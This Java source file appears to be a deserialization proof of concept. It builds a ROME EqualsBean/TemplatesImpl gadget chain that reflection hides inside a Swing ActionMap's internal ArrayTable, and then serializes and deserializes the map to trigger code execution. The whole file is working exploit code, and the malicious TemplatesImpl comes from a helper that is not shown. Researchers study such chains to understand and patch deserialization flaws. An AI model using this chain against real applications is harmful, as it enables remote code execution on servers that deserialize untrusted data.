package com.example.Rome;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;

import javax.swing.*;
import javax.swing.text.DefaultEditorKit;
import javax.xml.transform.Templates;

public class POC_8 {

    /***
     * run wtih actionMap_equals.jar
     */

    public static void main(String[] args) throws Exception {
        TemplatesImpl tmpl = Share.getTemplatesImplObj();
        EqualsBean bean = new EqualsBean(Templates.class, tmpl);

        ActionMap map = new ActionMap();
        DefaultEditorKit.BeepAction action = new DefaultEditorKit.BeepAction();

        Object arrayTable = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.ArrayTable"));
        Object[] table = new Object[]{bean, action, tmpl, action};

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(map, "arrayTable", arrayTable);

        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
